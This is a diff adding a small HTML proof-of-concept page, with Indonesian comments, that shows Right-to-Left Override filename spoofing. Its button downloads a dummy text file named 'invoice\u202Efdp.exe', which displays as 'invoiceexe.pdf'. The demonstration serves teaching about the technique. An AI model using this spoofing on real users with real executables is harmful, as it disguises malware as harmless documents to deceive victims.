@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>RTLO Filename Spoofing PoC</title>
+  <style>
+    body {
+      background: #111;
+      color: #0f0;
+      font-family: monospace;
+      padding: 2em;
+    }
+    h1 { color: #ff0; }
+    button {
+      padding: 10px 20px;
+      background: #222;
+      border: 1px solid #0f0;
+      color: #0f0;
+      font-size: 16px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <h1>RTLO Filename Spoofing PoC</h1>
+  <p>Klik tombol untuk mengunduh file dengan nama disamarkan.</p>
+  <button id="dlBtn">Download File</button>
+
+  <script>
+    document.getElementById("dlBtn").addEventListener("click", () => {
+      // isi file dummy agar aman
+      const content = "This is a harmless test file.\nRTLO spoofing demonstration.";
+      const blob = new Blob([content], { type: "application/octet-stream" });
+
+      // \u202E = Right-to-Left Override
+      // Aslinya: invoice[U+202E]fdp.exe
+      // Tampilan user: invoiceexe.pdf
+      const spoofedName = "invoice\u202Efdp.exe";
+
+      const a = document.createElement("a");
+      a.href = URL.createObjectURL(blob);
+      a.download = spoofedName;
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+    });
+  </script>
+</body>
+</html>
